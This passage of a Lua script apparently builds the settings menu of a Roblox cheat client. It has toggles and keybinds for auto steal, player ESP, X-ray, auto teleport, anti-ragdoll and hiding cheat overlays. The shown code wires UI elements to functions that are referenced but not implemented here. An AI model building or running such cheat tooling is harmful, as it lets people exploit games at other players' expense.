            Config.SelectSoundVolume = v; SaveConfig()
            if _G.BullysRefreshSelectSound then _G.BullysRefreshSelectSound() end
        end,
        0, 2, "", 58)

    -- ─── SELL ALERT ─────────────────────────────────────────────────────

    makeSec(cS, "SELL ALERT", 58)

    makeToggle(cS, "Floor Alert",
        function() return Config.SellAlertOn ~= false end,
        function(v) Config.SellAlertOn = v; SaveConfig() end, 59.1)

    do
        local r = makeRow(cS, 34, 59.2)
        local lbl = Instance.new("TextLabel", r)
        lbl.Size = UDim2.new(0.45, 0, 1, 0); lbl.Position = UDim2.new(0, 10, 0, 0)
        lbl.BackgroundTransparency = 1; lbl.Text = "Sound ID"
        lbl.Font = Enum.Font.GothamBold; lbl.TextSize = 11
        lbl.TextColor3 = Color3.fromRGB(200,200,210); lbl.TextXAlignment = Enum.TextXAlignment.Left

        local tb = Instance.new("TextBox", r)
        tb.Size = UDim2.new(0, 110, 0, 24); tb.Position = UDim2.new(1, -156, 0.5, -12)
        tb.BackgroundColor3 = C().SH; tb.Text = tostring(Config.SellSoundId or "9068077052")
        tb.Font = Enum.Font.Gotham; tb.TextSize = 11; tb.TextColor3 = C().TP
        tb.ClearTextOnFocus = false; tb.BorderSizePixel = 0
        Instance.new("UICorner", tb).CornerRadius = UDim.new(0, 5)
        tb.FocusLost:Connect(function()
            local id = tb.Text:match("%d+")
            if id then
                Config.SellSoundId = id; SaveConfig()
                if _G.BullysSellRefreshSound then _G.BullysSellRefreshSound() end
            end
            tb.Text = tostring(Config.SellSoundId or "")
        end)

        local testBtn = Instance.new("TextButton", r)
        testBtn.Size = UDim2.new(0, 40, 0, 24); testBtn.Position = UDim2.new(1, -42, 0.5, -12)
        testBtn.BackgroundColor3 = Color3.fromRGB(80, 140, 255); testBtn.Text = "test"
        testBtn.TextColor3 = Color3.new(0, 0, 0); testBtn.Font = Enum.Font.GothamBold
        testBtn.TextSize = 11; testBtn.BorderSizePixel = 0; testBtn.AutoButtonColor = false
        Instance.new("UICorner", testBtn).CornerRadius = UDim.new(0, 5)
        testBtn.MouseButton1Click:Connect(function()
            if _G.BullysSellTestSound then _G.BullysSellTestSound() end
        end)
    end

    makeSlider(cS, "Volume",
        function() return Config.SellVolume or 1 end,
        function(v) Config.SellVolume = math.floor(v + 0.5); SaveConfig(); if _G.BullysSellRefreshSound then _G.BullysSellRefreshSound() end end,
        1, 10, "", 59.3)

    -- ─── AUTO STEAL ─────────────────────────────────────────────────────

    makeSec(cS, "AUTO STEAL", 60)

    do

        local stealSwitches = {}

        local function applyStealMode(mode)

            -- mode: "nearest" | "highest" | "priority"

            Config.StealNearest  = (mode == "nearest")

            Config.StealHighest  = (mode == "highest")

            Config.StealPriority = (mode == "priority")

            -- also mirror onto DefaultTo so the logic persists on reload

            Config.DefaultToNearest  = (mode == "nearest")

            Config.DefaultToHighest  = (mode == "highest")

            Config.DefaultToPriority = (mode == "priority")

            Config.DefaultToDisable  = false

            Config.AutoTPPriority    = (mode == "nearest" or mode == "priority")

            SaveConfig()

            for _id, _sw in pairs(stealSwitches) do

                local _on = (_id=="nearest"  and Config.StealNearest)

                         or (_id=="highest"  and Config.StealHighest)

                         or (_id=="priority" and Config.StealPriority)

                TweenService:Create(_sw.dot, TweenInfo.new(0.15), {Position = _on and UDim2.new(1,-17,0.5,-7.5) or UDim2.new(0,2,0.5,-7.5)}):Play()

                -- tween removed

            end

            ShowNotification("STEAL MODE", "Steal " .. mode:sub(1,1):upper() .. mode:sub(2) .. " ENABLED")

        end

        local function makeStealRadio(parent, label, id, order)

            local isOn = (id=="nearest"  and Config.StealNearest)

                      or (id=="highest"  and Config.StealHighest)

                      or (id=="priority" and Config.StealPriority)

            local row = Instance.new("Frame", parent)

            row.Size = UDim2.new(1,0,0,36)

            row.BackgroundColor3 = C().SURF

            row.BackgroundTransparency = 0

            row.BorderSizePixel = 0

            row.LayoutOrder = order

            Instance.new("UICorner", row).CornerRadius = UDim.new(0,7)

            local tl = Instance.new("TextLabel", row)

            tl.Size = UDim2.new(1,-54,1,0)

            tl.Position = UDim2.new(0,10,0,0)

            tl.BackgroundTransparency = 1

            tl.Text = label

            tl.Font = Enum.Font.GothamBold

            tl.TextSize = 12

            tl.TextColor3 = C().TP

            tl.TextXAlignment = Enum.TextXAlignment.Left

            local sw = Instance.new("Frame", row)

            sw.Size = UDim2.new(0,38,0,20)

            sw.Position = UDim2.new(1,-46,0.5,-10)

            sw.BackgroundColor3 = isOn and Color3.fromRGB(80, 140, 255) or Color3.fromRGB(22,22,35)

            Instance.new("UICorner", sw).CornerRadius = UDim.new(1,0)

            local dot = Instance.new("Frame", sw)

            dot.Size = UDim2.new(0,15,0,15)

            dot.Position = isOn and UDim2.new(1,-17,0.5,-7.5) or UDim2.new(0,2,0.5,-7.5)

            dot.BackgroundColor3 = Color3.new(1,1,1)

            Instance.new("UICorner", dot).CornerRadius = UDim.new(1,0)

            local btn = Instance.new("TextButton", sw)

            btn.Size = UDim2.new(1,0,1,0)

            btn.BackgroundTransparency = 1

            btn.Text = ""

            btn.MouseButton1Click:Connect(function() applyStealMode(id) end)

            stealSwitches[id] = {bg=sw, dot=dot}

        end

        makeStealRadio(cS, "Steal Nearest",  "nearest",  61)

        makeStealRadio(cS, "Steal Highest",  "highest",  62)

        makeStealRadio(cS, "Steal Priority", "priority", 63)

    end

    -- ── VISUALS TAB ──

    local vS = tScrolls2["vis"]

    makeSec(vS,"ESP",1)

    makeToggle(vS,"X-Ray Base",function() return Config.XrayEnabled end,function(v) Config.XrayEnabled=v; if v then enableXray() else disableXray() end; SaveConfig() end,11)

    makeToggle(vS,"Player ESP",function() return Config.PlayerESP end,function(v) Config.PlayerESP=v; if playerESPToggleRef and playerESPToggleRef.setFn then playerESPToggleRef.setFn(v) end; SaveConfig() end,12)

    makeToggle(vS,"Brainrot ESP",function() return Config.BrainrotESP end,function(v) Config.BrainrotESP=v; if espToggleRef and espToggleRef.setFn then espToggleRef.setFn(v) end; SaveConfig() end,13)

    makeToggle(vS,"Conveyor ESP",function() return Config.ConveyorESP end,function(v) Config.ConveyorESP=v; SaveConfig() end,14)


    makeToggle(vS,"Subspace Mine ESP",function() return Config.SubspaceMineESP end,function(v) Config.SubspaceMineESP=v; SaveConfig() end,17)

    makeToggle(vS,"Server Pos",function() return Config.ServerPosVisualizerEnabled == true end,function(v)
        Config.ServerPosVisualizerEnabled = v; SaveConfig()
        if _G._serverPosVizToggle then pcall(_G._serverPosVizToggle, v) end
    end,18)

    makeToggle(vS,"Steal Plot ESP",function() return Config.ShowStealingPlotESP~=false end,function(v) Config.ShowStealingPlotESP=v; SaveConfig(); local g=PlayerGui:FindFirstChild("XiStealingPlotESP"); if g then g.Enabled=v end end,19)

    makeSec(vS,"OVERLAYS",20)

    makeToggle(vS,"Line to Base",function() return Config.LineToBase end,function(v) Config.LineToBase=v; if not v and _G.resetPlotBeam then pcall(_G.resetPlotBeam) end; SaveConfig() end,21)

    makeToggle(vS,"Unlock Buttons HUD",function() return Config.ShowUnlockButtonsHUD end,function(v)

        Config.ShowUnlockButtonsHUD=v; SaveConfig()

        local hudGui=PlayerGui:FindFirstChild("BullysStatusHUD")

        if not hudGui then return end

        local uc=hudGui:FindFirstChild("UnlockButtonsContainer")

        if uc then uc.Visible=v end

    end,22)

    makeSec(vS,"CAMERA",30)

    do

        local fR=Instance.new("Frame",vS); fR.Size=UDim2.new(1,0,0,52); fR.BackgroundColor3=C().SURF; fR.BorderSizePixel=0; fR.LayoutOrder=31

        Instance.new("UICorner",fR).CornerRadius=UDim.new(0,7)

        local fl=Instance.new("TextLabel",fR); fl.Size=UDim2.new(0.5,0,0,18); fl.Position=UDim2.new(0,10,0,4); fl.BackgroundTransparency=1; fl.Text="FOV"; fl.Font=Enum.Font.GothamBold; fl.TextSize=12; fl.TextColor3=C().TP; fl.TextXAlignment=Enum.TextXAlignment.Left

        local fV=Instance.new("TextLabel",fR); fV.Size=UDim2.new(0,40,0,18); fV.Position=UDim2.new(1,-48,0,4); fV.BackgroundTransparency=1; fV.Font=Enum.Font.GothamBlack; fV.TextSize=13; fV.TextColor3=Color3.fromRGB(80, 140, 255); fV.TextXAlignment=Enum.TextXAlignment.Right; fV.Text=tostring(Config.FOV or 70)

        local fbg=Instance.new("Frame",fR); fbg.Size=UDim2.new(1,-20,0,6); fbg.Position=UDim2.new(0,10,0,34); fbg.BackgroundColor3=C().SH; fbg.BorderSizePixel=0; Instance.new("UICorner",fbg).CornerRadius=UDim.new(1,0)

        local ff=Instance.new("Frame",fbg); ff.BackgroundColor3=Color3.fromRGB(80, 140, 255); ff.BorderSizePixel=0; ff.Size=UDim2.new(0,0,1,0); Instance.new("UICorner",ff).CornerRadius=UDim.new(1,0)

        local fk=Instance.new("Frame",fbg); fk.Size=UDim2.new(0,13,0,13); fk.AnchorPoint=Vector2.new(0.5,0.5); fk.BackgroundColor3=Color3.new(1,1,1); fk.BorderSizePixel=0; Instance.new("UICorner",fk).CornerRadius=UDim.new(1,0)

        local function updFOV(v) v=math.clamp(math.floor(v),30,180); Config.FOV=v; SaveConfig(); fV.Text=tostring(v); local p=(v-30)/150; ff.Size=UDim2.new(p,0,1,0); fk.Position=UDim2.new(p,0,0.5,0); if Workspace.CurrentCamera then Workspace.CurrentCamera.FieldOfView=v end end

        updFOV(Config.FOV or 70)

        local fD=false

        fbg.InputBegan:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then fD=true end end)

        UserInputService.InputEnded:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then fD=false end end)

        UserInputService.InputChanged:Connect(function(i) if fD and (i.UserInputType==Enum.UserInputType.MouseMovement or i.UserInputType==Enum.UserInputType.Touch) then updFOV(30+math.clamp((i.Position.X-fbg.AbsolutePosition.X)/fbg.AbsoluteSize.X,0,1)*150) end end)

    end

    makeSec(vS,"PERFORMANCE",40)

    makeToggle(vS,"FPS Boost",function() return Config.FPSBoost end,function(v) setFPSBoost(v) end,41)

    -- ── MOVEMENT TAB ──

    local mS = tScrolls2["mov"]

    makeSec(mS,"MOVIMENTO",1)

    makeToggle(mS,"Infinite Jump",function() return State.infiniteJumpEnabled end,function(v) setInfiniteJump(v) end,11)

    local _movAutoBackToggle = makeToggle(mS,"Auto Back",function() return Config.AutoBack end,function(v)
        Config.AutoBack=v; SaveConfig()
        if v and _G.startAutoBack then _G.startAutoBack() elseif _G.stopAutoBack then _G.stopAutoBack() end
        if _G._autoBackMiniRefresh then pcall(_G._autoBackMiniRefresh) end
    end,14)
    _G._autoBackSettingsRefresh = _movAutoBackToggle.refresh

    makeToggle(mS,"Anti Body Swap [Beta]",function() return Config.AntiSwapEnabled ~= false end,function(v) Config.AntiSwapEnabled=v; SaveConfig(); ShowNotification("ANTI-SWAP", v and "ENABLED" or "DISABLED") end,15)

    makeSec(mS,"ANTI-RAGDOLL",20)

    makeToggle(mS,"Anti-Ragdoll V2",function() return Config.AntiRagdollV2 end,function(v) Config.AntiRagdollV2=v; if v then Config.AntiRagdoll=0; startAntiRagdoll(0); startAntiRagdollV2(true) else startAntiRagdollV2(false) end; SaveConfig() end,22)

    makeToggle(mS,"Auto Unlock on Steal",function() return Config.AutoUnlockOnSteal end,function(v) Config.AutoUnlockOnSteal=v; SaveConfig() end,281)

    makeToggle(mS,"Auto Kick no Steal",function() return Config.AutoKickOnSteal end,function(v) if _G.setAutoKickFromSettings then _G.setAutoKickFromSettings(v) else Config.AutoKickOnSteal=v; SaveConfig() end end,32)

    makeToggle(mS,"Anti-Bee & Disco",function() return Config.AntiBeeDisco end,function(v) Config.AntiBeeDisco=v; SaveConfig(); if v and SharedState.ANTI_BEE_DISCO then SharedState.ANTI_BEE_DISCO.Enable() elseif SharedState.ANTI_BEE_DISCO then SharedState.ANTI_BEE_DISCO.Disable() end end,34)

    makeToggle(mS,"Limpar Error GUIs",function() return Config.CleanErrorGUIs end,function(v) Config.CleanErrorGUIs=v; SaveConfig() end,35)

    makeSec(mS,"BINDS",40)

    makeKey(mS,"Ragdoll Self",function() return Config.RagdollSelfKey ~= "" and Config.RagdollSelfKey or "NONE" end,function(v) Config.RagdollSelfKey=v; SaveConfig() end,43)

    makeKey(mS,"Reset",function() return Config.ResetKey end,function(v) Config.ResetKey=v end,44)

    makeKey(mS,"Menu",function() return Config.MenuKey end,function(v) Config.MenuKey=v end,46)

    makeKey(mS,"Kick",function() return Config.KickKey ~= "" and Config.KickKey or "NONE" end,function(v) Config.KickKey=(v=="NONE" and "" or v) end,47)

    makeKey(mS,"Click To AP",function() return Config.ClickToAPKeybind or "L" end,function(v) Config.ClickToAPKeybind=v; SaveConfig() end,48)

    makeKey(mS,"Proximity AP",function() return Config.ProximityAPKeybind or "P" end,function(v) Config.ProximityAPKeybind=v; SaveConfig() end,49)

    makeKey(mS,"Auto Buy Toggle Key",function() return Config.AutoBuyKey or "K" end,function(v) Config.AutoBuyKey=v; SaveConfig() end,50)

    -- ── TP TAB ──

    local tpS = tScrolls2["tp"]

    makeSec(tpS,"AUTO TP",10)

    makeToggle(tpS,"Auto TP on Script Load",function() return Config.TpSettings.TpOnLoad end,function(v) Config.TpSettings.TpOnLoad=v; SaveConfig() end,11)

    do

        local r=Instance.new("Frame",tpS); r.Size=UDim2.new(1,0,0,36); r.BackgroundColor3=C().SURF; r.BorderSizePixel=0; r.LayoutOrder=12; Instance.new("UICorner",r).CornerRadius=UDim.new(0,7)

        local lbl=Instance.new("TextLabel",r); lbl.Size=UDim2.new(0.6,0,0,16); lbl.Position=UDim2.new(0,10,0,10); lbl.BackgroundTransparency=1; lbl.Text="Min Gen for Auto TP"; lbl.Font=Enum.Font.GothamBold; lbl.TextSize=11; lbl.TextColor3=C().TP; lbl.TextXAlignment=Enum.TextXAlignment.Left

        local tb=Instance.new("TextBox",r); tb.Size=UDim2.new(0,110,0,24); tb.Position=UDim2.new(1,-118,0.5,-12); tb.BackgroundColor3=C().SH; tb.Text=tostring(Config.TpSettings.MinGenForTp or ""); tb.Font=Enum.Font.Gotham; tb.TextSize=11; tb.TextColor3=C().TP; tb.PlaceholderText="e.g. 5k, 1m, 1b"; tb.ClearTextOnFocus=false; Instance.new("UICorner",tb).CornerRadius=UDim.new(0,5)

        tb.FocusLost:Connect(function() Config.TpSettings.MinGenForTp=tb.Text:gsub("%s",""); SaveConfig() end)

    end

    makeSec(tpS,"TP TOOL",19)

    do

        local tools={"Flying Carpet","Cupid's Wings","Santa's Sleigh","Witch's Broom"}; local sws={}

        for idx,tn in ipairs(tools) do

            local r=Instance.new("Frame",tpS); r.Size=UDim2.new(1,0,0,34); r.BackgroundColor3=C().SURF; r.BorderSizePixel=0; r.LayoutOrder=20+idx; Instance.new("UICorner",r).CornerRadius=UDim.new(0,7)

            local lbl=Instance.new("TextLabel",r); lbl.Size=UDim2.new(1,-60,1,0); lbl.Position=UDim2.new(0,10,0,0); lbl.BackgroundTransparency=1; lbl.Text=tn; lbl.Font=Enum.Font.GothamBold; lbl.TextSize=11; lbl.TextColor3=C().TP; lbl.TextXAlignment=Enum.TextXAlignment.Left

            local sw=Instance.new("TextButton",r); sw.Size=UDim2.new(0,50,0,22); sw.Position=UDim2.new(1,-58,0.5,-11); sw.Font=Enum.Font.GothamBold; sw.TextSize=11; sw.AutoButtonColor=false; Instance.new("UICorner",sw).CornerRadius=UDim.new(0,5)

            local function ref() local on=Config.TpSettings.Tool==tn; sw.Text=on and"ON"or"OFF"; sw.BackgroundColor3=on and Color3.fromRGB(80, 140, 255) or C().SH; sw.TextColor3=on and Color3.new(0,0,0) or C().TP end

            ref(); sw.MouseButton1Click:Connect(function() Config.TpSettings.Tool=tn; SaveConfig(); for _,s in pairs(sws) do pcall(s) end end); sws[tn]=ref

        end

    end

    makeSec(tpS,"TP AUTOMATION",30)

    makeToggle(tpS,"Auto TP Priority Mode",function() return Config.AutoTPPriority end,function(v) Config.AutoTPPriority=v; SaveConfig() end,31)


    makeToggle(tpS,"Auto TP Follow Target",function() return Config.AutoTPFollowTarget or false end,function(v) Config.AutoTPFollowTarget=v; SaveConfig() end,33)

    makeSec(tpS,"TP MODE",34.5)

    do
        local r = makeRow(tpS, 34, 34.7)
        local lbl = Instance.new("TextLabel", r)
        lbl.Size = UDim2.new(0.5, 0, 1, 0); lbl.Position = UDim2.new(0, 10, 0, 0)
        lbl.BackgroundTransparency = 1; lbl.Text = "TP Mode"
        lbl.Font = Enum.Font.GothamBold; lbl.TextSize = 11
        lbl.TextColor3 = Color3.fromRGB(200, 200, 210); lbl.TextXAlignment = Enum.TextXAlignment.Left

        local btnCont = Instance.new("Frame", r)
        btnCont.Size = UDim2.new(0, 190, 0, 24); btnCont.Position = UDim2.new(1, -198, 0.5, -12); btnCont.BackgroundTransparency = 1

        local modes = {"Side", "2Sides", "Front", "Auto"}
        local modeBtns = {}
        for i, mode in ipairs(modes) do
            local b = Instance.new("TextButton", btnCont)
            local step = 1 / #modes
            b.Size = UDim2.new(step - 0.02, 0, 1, 0); b.Position = UDim2.new((i-1)*step, 0, 0, 0)
            b.Text = mode; b.Font = Enum.Font.GothamBold; b.TextSize = 11; b.AutoButtonColor = false
            b.BorderSizePixel = 0
            Instance.new("UICorner", b).CornerRadius = UDim.new(0, 4)
            modeBtns[mode] = b
        end

        local function refresh()
            for mode, b in pairs(modeBtns) do
                local on = (Config.TpSettings.TpMode or "Side") == mode
                b.BackgroundColor3 = on and Color3.fromRGB(80, 140, 255) or Color3.fromRGB(45, 45, 55)
                b.TextColor3       = on and Color3.new(0, 0, 0) or Color3.fromRGB(200, 200, 210)
            end
        end
        refresh()

        for mode, b in pairs(modeBtns) do
            b.MouseButton1Click:Connect(function()
                Config.TpSettings.TpMode = mode
                SaveConfig()
                refresh()
                ShowNotification("TP MODE", "Set to " .. mode)
            end)
        end
    end

    -- ─── PER-BASE TP MODE (override por base 1-8; Default = TpMode global) ───
    makeSec(tpS, "PER-BASE TP MODE", 34.8)

    do
        local r = makeRow(tpS, 32, 34.805)  -- entre o section label (34.8) e as bases (34.81+)
        local btn = Instance.new("TextButton", r)
        btn.Size = UDim2.new(1, -20, 0, 26); btn.Position = UDim2.new(0, 10, 0.5, -13)
        btn.BackgroundColor3 = Color3.fromRGB(60, 140, 255); btn.TextColor3 = Color3.new(1, 1, 1)
        btn.Text = "Show Base Numbers (20s)"
        btn.Font = Enum.Font.GothamBold; btn.TextSize = 11; btn.AutoButtonColor = false
        btn.BorderSizePixel = 0
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)
        btn.MouseButton1Click:Connect(function()
            if _G.BullysShowBaseNumbers then _G.BullysShowBaseNumbers() end
            local origColor = btn.BackgroundColor3
            btn.BackgroundColor3 = Color3.fromRGB(80, 140, 255); btn.Text = "Showing..."
            task.delay(20, function()
                if btn and btn.Parent then
                    btn.BackgroundColor3 = origColor; btn.Text = "Show Base Numbers (20s)"
                end
            end)
        end)
    end

    do
        local perBaseModes = {"Default", "Side", "2Sides", "Front", "Auto"}

        -- Mini popup (único, reusado ao clicar em qualquer base)
        local popupGui = Instance.new("ScreenGui")
        popupGui.Name = "BullysBaseModePopup"; popupGui.ResetOnSpawn = false
        popupGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        popupGui.DisplayOrder = 200
        popupGui.Parent = PlayerGui

        local popup = Instance.new("Frame", popupGui)
        popup.Size = UDim2.new(0, 140, 0, #perBaseModes * 28 + 10)
        popup.BackgroundColor3 = Color3.fromRGB(22, 22, 32)
        popup.BorderSizePixel = 0
        popup.Visible = false
        Instance.new("UICorner", popup).CornerRadius = UDim.new(0, 6)
        local ps = Instance.new("UIStroke", popup); ps.Color = Color3.fromRGB(60, 140, 255); ps.Thickness = 1
        local pLay = Instance.new("UIListLayout", popup)
        pLay.Padding = UDim.new(0, 2); pLay.SortOrder = Enum.SortOrder.LayoutOrder
        local pPad = Instance.new("UIPadding", popup)
        pPad.PaddingTop = UDim.new(0, 5); pPad.PaddingBottom = UDim.new(0, 5)
        pPad.PaddingLeft = UDim.new(0, 5); pPad.PaddingRight = UDim.new(0, 5)

        local popupTargetBase = nil
        local refreshFns = {}

        for i, mode in ipairs(perBaseModes) do
            local b = Instance.new("TextButton", popup)
            b.Size = UDim2.new(1, 0, 0, 26); b.LayoutOrder = i
            b.BackgroundColor3 = Color3.fromRGB(36, 36, 48); b.TextColor3 = Color3.fromRGB(220, 220, 230)
            b.Text = mode; b.Font = Enum.Font.GothamBold; b.TextSize = 11; b.AutoButtonColor = false
            b.BorderSizePixel = 0
            Instance.new("UICorner", b).CornerRadius = UDim.new(0, 4)
            b.MouseButton1Click:Connect(function()
                if not popupTargetBase then return end
                Config.TpSettings.PerBaseTpMode = Config.TpSettings.PerBaseTpMode or {}
                Config.TpSettings.PerBaseTpMode[tostring(popupTargetBase)] = mode
                SaveConfig()
                popup.Visible = false
                local rf = refreshFns[popupTargetBase]; if rf then rf() end
            end)
            b.MouseEnter:Connect(function() b.BackgroundColor3 = Color3.fromRGB(60, 140, 255) end)
            b.MouseLeave:Connect(function() b.BackgroundColor3 = Color3.fromRGB(36, 36, 48) end)
        end

        -- Fecha popup ao clicar fora
        UserInputService.InputBegan:Connect(function(input, processed)
            if processed then return end
            if input.UserInputType ~= Enum.UserInputType.MouseButton1
               and input.UserInputType ~= Enum.UserInputType.Touch then return end
            if not popup.Visible then return end
            local mouse = UserInputService:GetMouseLocation()
            local ap, as = popup.AbsolutePosition, popup.AbsoluteSize
            if mouse.X < ap.X or mouse.X > ap.X + as.X or mouse.Y < ap.Y or mouse.Y > ap.Y + as.Y then
                popup.Visible = false
            end
        end)

        for baseIdx = 1, 8 do
            local r = makeRow(tpS, 30, 34.8 + baseIdx * 0.01)
            local lbl = Instance.new("TextLabel", r)
            lbl.Size = UDim2.new(0.3, 0, 1, 0); lbl.Position = UDim2.new(0, 10, 0, 0)
            lbl.BackgroundTransparency = 1; lbl.Text = "Base " .. baseIdx
            lbl.Font = Enum.Font.GothamBold; lbl.TextSize = 11
            lbl.TextColor3 = Color3.fromRGB(200, 200, 210); lbl.TextXAlignment = Enum.TextXAlignment.Left

            local selectBtn = Instance.new("TextButton", r)
            selectBtn.Size = UDim2.new(0, 90, 0, 22); selectBtn.Position = UDim2.new(1, -98, 0.5, -11)
            selectBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 55); selectBtn.TextColor3 = Color3.fromRGB(200, 200, 210)
            selectBtn.Font = Enum.Font.GothamBold; selectBtn.TextSize = 10; selectBtn.AutoButtonColor = false
            selectBtn.BorderSizePixel = 0
            Instance.new("UICorner", selectBtn).CornerRadius = UDim.new(0, 4)

            local function getCur()
                local pb = Config.TpSettings.PerBaseTpMode or {}
                return pb[tostring(baseIdx)] or "Default"
            end
            local function refresh()
                local m = getCur()
                selectBtn.Text = m
                if m == "Default" then
                    selectBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
                    selectBtn.TextColor3 = Color3.fromRGB(160, 160, 170)
                else
                    selectBtn.BackgroundColor3 = Color3.fromRGB(80, 140, 255)
                    selectBtn.TextColor3 = Color3.new(0, 0, 0)
                end
            end
            refreshFns[baseIdx] = refresh
            refresh()

            selectBtn.MouseButton1Click:Connect(function()
                popupTargetBase = baseIdx
                local ap = selectBtn.AbsolutePosition
                local as = selectBtn.AbsoluteSize
                popup.Position = UDim2.new(0, ap.X + as.X - 140, 0, ap.Y + as.Y + 2)
                popup.Visible = true
            end)
        end
    end

    makeSec(tpS,"TP TIMING",35)

    makeSlider(tpS, "TP Delay",
        function() return (Config.TpSettings.TpDelay or 0) / 1000 end,
        function(v) Config.TpSettings.TpDelay = math.floor(v * 1000 + 0.5); SaveConfig() end,
        0, 1, "s", 36)

    makeToggle(tpS, "TP After FPS",
        function() return Config.TpSettings.TpAfterFps or false end,
        function(v) Config.TpSettings.TpAfterFps = v; SaveConfig() end,
        37)

    makeSlider(tpS, "FPS Threshold",
        function() return Config.TpSettings.FpsThreshold or 60 end,
        function(v) Config.TpSettings.FpsThreshold = math.floor(v + 0.5); SaveConfig() end,
        10, 300, " fps", 38)

    makeSlider(tpS, "FPS Wait",
        function() return Config.TpSettings.FpsWait or 0 end,
        function(v) Config.TpSettings.FpsWait = v; SaveConfig() end,
        0, 5, "s", 39)

    makeSec(tpS,"TP KEYBINDS",40)

    makeKey(tpS,"TP Keybind",function() return Config.TpSettings.TpKey end,function(v) Config.TpSettings.TpKey=v end,41)

    makeKey(tpS,"Auto Clone Keybind",function() return Config.TpSettings.CloneKey end,function(v) Config.TpSettings.CloneKey=v end,42)

    makeKey(tpS,"Carpet Speed Keybind",function() return Config.TpSettings.CarpetSpeedKey end,function(v) Config.TpSettings.CarpetSpeedKey=v end,43)

    -- ── UI HIDE'S TAB ──

    local uhS = tScrolls2["uih"]

    makeSec(uhS,"HIDE UIs",1)

    makeToggle(uhS,"Hide Admin Panel",function() return Config.HideAdminPanel end,function(v) Config.HideAdminPanel=v; SaveConfig(); local g=PlayerGui:FindFirstChild("XiAdminPanel"); if g then g.Enabled=not v end end,11)

    makeToggle(uhS,"Hide Auto Steal",function() return Config.HideAutoSteal end,function(v) Config.HideAutoSteal=v; SaveConfig(); local g=PlayerGui:FindFirstChild("AutoStealUI"); if g then g.Enabled=not v end end,12)

    makeToggle(uhS,"Hide Status HUD",function() return Config.HideStatusHUD end,function(v) Config.HideStatusHUD=v; SaveConfig(); local g=PlayerGui:FindFirstChild("BullysStatusHUD"); if g then g.Enabled=not v end end,15)

    makeToggle(uhS,"Mostrar Mini UI",function() return Config.ShowMiniActions end,function(v) Config.ShowMiniActions=v; SaveConfig(); local g=PlayerGui:FindFirstChild("BullysMiniActions"); if g then local mp=g:FindFirstChild("MiniPanel"); if mp then mp.Visible=v end end end,19)

    makeToggle(uhS,"Auto Hide ao Iniciar",function() return Config.AutoHideMiniUI end,function(v) Config.AutoHideMiniUI=v; SaveConfig() end,20)

    switchTab2("cfg")

    -- Expor ref global

    _G.BullysSettingsUI = {panel=panel, switchTab=switchTab2, currentTab="cfg"}

end

task.spawn(buildBullysSettingsUI)

task.spawn(function()

    task.wait(1.5)

    if Config.CurrentTheme and THEMES and THEMES[Config.CurrentTheme] then

        applyTheme(Config.CurrentTheme)

    end

end)

function buildMiniActionsUI()
    local pg = PlayerGui
    if not pg then return end
    local old = pg:FindFirstChild("BullysMiniActions")
    if old then old:Destroy() end

    local maGui = Instance.new("ScreenGui")
    maGui.Name          = "BullysMiniActions"
    maGui.ResetOnSpawn  = false
    maGui.DisplayOrder  = 25
    maGui.Parent        = pg

    local BTN_H = 28

    -- ── PAINEL principal ──────────────────────────────────────────────────
    local panel = Instance.new("Frame", maGui)
    panel.Name                   = "MiniPanel"
    panel.Size                   = UDim2.new(0, 260, 0, 10)
    panel.AutomaticSize          = Enum.AutomaticSize.Y
    local sp = Config.MiniUIPos or {X=0.01, Y=0.35}
    panel.Position               = UDim2.new(sp.X, 0, sp.Y, 0)
    panel.BackgroundColor3       = Color3.fromRGB(6, 6, 9)
    panel.BackgroundTransparency = 0.08
    panel.BorderSizePixel        = 0
    panel.Visible                = not Config.AutoHideMiniUI
    Instance.new("UICorner", panel).CornerRadius = UDim.new(0, 10)

    local panelLayout = Instance.new("UIListLayout", panel)
    panelLayout.FillDirection    = Enum.FillDirection.Vertical
    panelLayout.SortOrder        = Enum.SortOrder.LayoutOrder
    panelLayout.Padding          = UDim.new(0, 0)

    -- ── HEADER ────────────────────────────────────────────────────────────
    local header = Instance.new("Frame", panel)
    header.Size                  = UDim2.new(1, 0, 0, 32)
    header.BackgroundTransparency = 1
    header.LayoutOrder           = 0

    local titleLbl = Instance.new("TextLabel", header)
    titleLbl.Size                = UDim2.new(0, 70, 1, 0)
    titleLbl.Position            = UDim2.new(0, 12, 0, 0)
    titleLbl.BackgroundTransparency = 1
    titleLbl.Text                = "ACTIONS"
    titleLbl.Font                = Enum.Font.GothamBlack
    titleLbl.TextSize            = 11
    titleLbl.TextColor3          = Color3.fromRGB(170, 172, 200)
    titleLbl.TextTransparency    = 0.05
    titleLbl.TextXAlignment      = Enum.TextXAlignment.Left

    -- Status dot + contador de slots ao lado do título ACTIONS
    local slotDot = Instance.new("Frame", header)
    slotDot.Size               = UDim2.new(0, 7, 0, 7)
    slotDot.Position           = UDim2.new(0, 82, 0.5, -3.5)
    slotDot.BackgroundColor3   = Color3.fromRGB(80,200,100)
    slotDot.BorderSizePixel    = 0
    Instance.new("UICorner", slotDot).CornerRadius = UDim.new(1, 0)

    local slotLbl = Instance.new("TextLabel", header)
    slotLbl.Size               = UDim2.new(0, 60, 1, 0)
    slotLbl.Position           = UDim2.new(0, 94, 0, 0)
    slotLbl.BackgroundTransparency = 1
    slotLbl.Text               = "0/10 slots"
    slotLbl.Font               = Enum.Font.GothamBold
    slotLbl.TextSize           = 10
    slotLbl.TextColor3         = Color3.fromRGB(140, 142, 160)
    slotLbl.TextXAlignment     = Enum.TextXAlignment.Left

    task.spawn(function()
        while header.Parent do
            local filled = _G.BullysSellFilledCount or 0
            slotLbl.Text = filled .. "/10 slots"
            -- 🟢 10/10 (cheio, sem alerta) | 🔴 <10 (precisa reabastecer, alerta ativo)
            slotDot.BackgroundColor3 = (filled == 10)
                and Color3.fromRGB(80, 200, 100)
                or  Color3.fromRGB(200, 60, 60)
            task.wait(0.5)
        end
    end)

    local minBtn = Instance.new("TextButton", header)
    minBtn.Size                  = UDim2.new(0, 20, 0, 20)
    minBtn.Position              = UDim2.new(1, -26, 0.5, -10)
    minBtn.BackgroundTransparency = 1
    minBtn.Text                  = "-"
    minBtn.Font                  = Enum.Font.GothamBlack
    minBtn.TextSize              = 16
